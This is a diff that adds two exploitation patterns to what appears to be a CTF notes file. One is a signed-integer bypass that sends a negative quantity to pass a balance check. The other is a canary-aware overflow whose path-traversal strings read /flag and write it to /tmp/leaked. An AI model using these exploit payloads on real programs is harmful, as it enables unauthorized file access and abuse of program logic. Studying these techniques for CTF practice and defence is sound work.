@@ -294,6 +294,39 @@ payload = b'A' * 64 + b'BIRD' + b'X'  # Preserve canary, set target to non-zero
 
 ---
 
+## Signed Integer Bypass (Negative Quantity)
+
+**Pattern (PascalCTF 2026):** Menu program with `scanf("%d")` for quantity. Negative input makes `quantity * price` negative, bypassing `balance >= total_cost` check.
+
+```python
+# Select expensive item (e.g., flag drink costing 1B), enter quantity -1
+# -1 * 1000000000 = -1000000000 → balance (100) >= -1000000000 ✓
+p.sendline(b'10')  # flag item
+p.sendline(b'-1')  # negative quantity
+```
+
+## Canary-Aware Partial Overflow
+
+**Pattern (MyGit, PascalCTF 2026):** Buffer overflow where `valid` flag sits between buffer end and canary.
+
+**Stack layout:**
+- Buffer: `rbp-0x30` (48 bytes)
+- Valid flag: `rbp-0x10` (offset 32 from buffer)
+- Stack canary: `rbp-0x08` (offset 40 from buffer)
+
+**Key technique:** Use `./` as no-op path padding to control input length precisely:
+```
+././././././././././../../../../flag    (36 bytes)
+```
+- `./` segments normalize to current directory (no-op)
+- Byte 32 must be non-zero to set `valid = true`
+- Stay under byte 40 to avoid canary
+
+**Exploit chain:**
+1. `checkout ././././././././././../../../../flag` - reads `/flag` content as "current commit"
+2. `branch create ././././././././././../../../../tmp/leaked` - writes commit (flag) to `/tmp/leaked`
+3. `cat /tmp/leaked` - read the exfiltrated flag
+
 ## Global Buffer Overflow (CSV Injection)
 
 **Pattern (Spreadsheet):** Adjacent global variables exploitable via overflow.
